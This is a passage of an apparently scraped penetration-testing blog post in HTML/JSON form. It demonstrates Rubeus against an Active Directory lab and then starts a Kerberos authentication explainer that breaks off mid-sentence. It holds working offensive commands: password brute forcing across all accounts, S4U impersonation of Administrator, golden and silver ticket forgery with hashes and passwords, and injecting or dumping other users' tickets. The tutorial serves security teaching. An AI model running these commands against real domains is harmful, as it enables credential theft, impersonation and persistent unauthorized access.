alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&amp;ssl=1\"></p>\n<p>As you may now observe that after a specified time interval a renewed TGT is shown</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&amp;ssl=1\"></p>\n<p><strong>Brute</strong></p>\n<p>The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. &#x2F;noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,</p>\n<p><code>rubeus.exe brute /password:Password@1 /noticket</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&amp;ssl=1\"></p>\n<p><strong>Hash</strong></p>\n<p>Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a <strong>hash</strong> function and provide a domain using &#x2F;domain, an account’s name (can be a machine account too) using the&#x2F;user flag and the password using &#x2F;password.</p>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&amp;ssl=1\"></p>\n<p>As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</p>\n<p><strong>S4u</strong></p>\n<p>We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link <strong><a href=\"https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/\">here</a></strong>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the <strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong> option set in the attribute’s editor. Follow the article <strong><a href=\"https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/\">here</a></strong> for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.</p>\n<ul>\n<li><p>&#x2F;rc4: flag is used to provide user noob’s account.</p>\n</li>\n<li><p>&#x2F;impersonateuser: User that will be impersonated by noob.</p>\n</li>\n<li><p>&#x2F;msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller</p>\n</li>\n<li><p>&#x2F;altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.</p>\n</li>\n<li><p>&#x2F;ptt: Injects the resulting ticket in the current terminal session</p>\n</li>\n</ul>\n<p><code>rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&amp;ssl=1\"></p>\n<p>This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Golden-Ticket\"><a href=\"#Golden-Ticket\" class=\"headerlink\" title=\"Golden Ticket\"></a>Golden Ticket</h3><p>Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article <strong><a href=\"https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/\">here</a></strong>.</p>\n<p>To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</p>\n<ul>\n<li><p>&#x2F;ldap: Retrieves information of user over LDAP protocol</p>\n</li>\n<li><p>&#x2F;user: Username whose ticket will be forged</p>\n</li>\n<li><p>&#x2F;printcmd: displays a one liner command that can be used to generate the ticket again that just got generated</p>\n</li>\n</ul>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><code>rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&amp;ssl=1\"></p>\n<p>As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&amp;ssl=1\"></p>\n<p>Also, at the end you’ll see a one liner command that can be used to generate this TGT again.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&amp;ssl=1\"></p>\n<p>Various other options can be used in conjunction with golden to modify the generated TGT like:</p>\n<ul>\n<li><p>&#x2F;rangeinterval: After every time specified, a new ticket will be generated.</p>\n</li>\n<li><p>&#x2F;rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.</p>\n</li>\n</ul>\n<p>For a full list of modifications, see <a href=\"https://github.com/GhostPack/Rubeus#ticket-forgery\">this</a> page.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Silver-Ticket\"><a href=\"#Silver-Ticket\" class=\"headerlink\" title=\"Silver Ticket\"></a>Silver Ticket</h3><p>Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page <strong><a href=\"https://adsecurity.org/?p=2011\">here</a></strong>.</p>\n<p>Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:</p>\n<ul>\n<li><p>&#x2F;service: SPN of the service ticket is being generated for</p>\n</li>\n<li><p>&#x2F;rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket</p>\n</li>\n<li><p>&#x2F;user: username of the user whose hash is provided</p>\n</li>\n<li><p>&#x2F;creduser: User to be impersonated</p>\n</li>\n<li><p>&#x2F;credpassword: Password of the user to be impersonated</p>\n</li>\n<li><p>&#x2F;krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</p>\n</li>\n<li><p>&#x2F;krbenctype: type of encrypted hash used. Aes256 here.</p>\n</li>\n</ul>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><code>rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&amp;ssl=1\"></p>\n<p>This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive</p>\n<p><code>dir \\\\dc1.ignite.local\\c$</code><br><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Ticket-Management\"><a href=\"#Ticket-Management\" class=\"headerlink\" title=\"Ticket Management\"></a>Ticket Management</h3><p>Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</p>\n<p><strong>Ptt</strong></p>\n<p>The Rubeus ptt option can import the supplied ticket in command line. The &#x2F;ptt can also be used in conjunction with other options that output tickets. For example,</p>\n<p><code>rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&amp;ssl=1\"></p>\n<p>As you can see, the generated ticket has now been imported.</p>\n<p><strong>Purge</strong></p>\n<p>Rubeus has a purge option which can purge&#x2F;delete all the tickets existing in the current session.</p>\n<p>Here, we demonstrate how we purged 2 tickets listed by klist.</p>\n<p><code>rubeus.exe purge</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&amp;ssl=1\"></p>\n<p><strong>Describe</strong></p>\n<p>Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</p>\n<p>We can provide the ticket using &#x2F;ticket flag.</p>\n<p><code>rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&amp;ssl=1\"></p>\n<p><strong>Triage</strong></p>\n<p>While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.</p>\n<ul>\n<li>&#x2F;luid: This flag can be used to provide a specific user ID.</li>\n</ul>\n<p><code>rubeus.exe triage</code><br><code>rubeus.exe triage /luid:*0x8f57c*</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&amp;ssl=1\"></p>\n<p>Also, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)</p>\n<p><code>rubeus.exe purge /luid:*0x8f57c*</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&amp;ssl=1\"></p>\n<p><strong>Dump</strong></p>\n<p>If the session is running in an elevated mode, a user can dump&#x2F; extract all the current TGTs and service tickets. Again, &#x2F;luid can be provided to dump specific user’s tickets. &#x2F;service can be used to filter these tickets.</p>\n<p>For example, &#x2F;service:krbtgt displays only TGTs.</p>\n<p><code>rubeus.exe dump</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&amp;ssl=1\"></p>\n<p>Next part I’ll work on the mitigation bit as it’s own unit hope you learnt a few bit on the read … 😊   </p>\n","cover":false,"excerpt":"","more":"<p><img src=\"https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png\"></p>\n<h2 id=\"Kerberoasting\"><a href=\"#Kerberoasting\" class=\"headerlink\" title=\"Kerberoasting\"></a>Kerberoasting</h2><p>The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.</p>\n<p><em>NB</em> [<strong><strong>kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network</strong>]</strong></p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png\"></p>\n<h3 id=\"How-Kerb-Auth-works\"><a href=\"#How-Kerb-Auth-works\" class=\"headerlink\" title=\"How Kerb Auth works!\"></a>How Kerb Auth works!</h3><p>In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.</p>\n<p><img src=\"https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png\" alt=\"1.webp\"></p>\n<p>Kerberos uses symmetric cryptography for encryption and decryption.</p>\n<p>For explanation purposes, we use three colours to distinguish Hashes:</p>\n<ul>\n<li><strong>BLUE _KEY</strong>: User NTLM HASH</li>\n<li><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</li>\n<li><strong>RED_KEY:</strong> Service NTLM HASH</li>\n</ul>\n<p><strong>Step 1:</strong> By sending the request message to KDC, the client initializes communication as:</p>\n<p><em><strong>KRB_AS_REQ contains the following:</strong></em></p>\n<ul>\n<li>The username of the client is to be authenticated.</li>\n<li><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with the Krbtgt account</em></li>\n<li><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></li>\n</ul>\n<p>The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</p>\n<p><strong>Step 2:</strong> The KDC uses a database consisting of Users&#x2F;Krbtgt&#x2F;Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</p>\n<p>Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</p>\n<p><em><strong>KRB_AS_REP contains the following:</strong></em></p>\n<ul>\n<li><em><strong>Username</strong></em></li>\n<li><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></li>\n<li><em>Session key</em></li>\n<li><em>The expiration date of TGT</em></li>\n<li><em><strong>TGT</strong>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></li>\n<li><em>Username</em></li>\n<li><em>Session key</em></li>\n<li><em>The expiration date of TGT</em></li>\n<li><em>PAC with user privileges, signed by KDC</em></li>\n</ul>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&amp;ssl=1\"></p>\n<p><strong>Step 3:</strong> The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</p>\n<p><em><strong>KRB_TGS_REQ</strong> contains:</em></p>\n<ul>\n<li><em>Encrypted data with the session 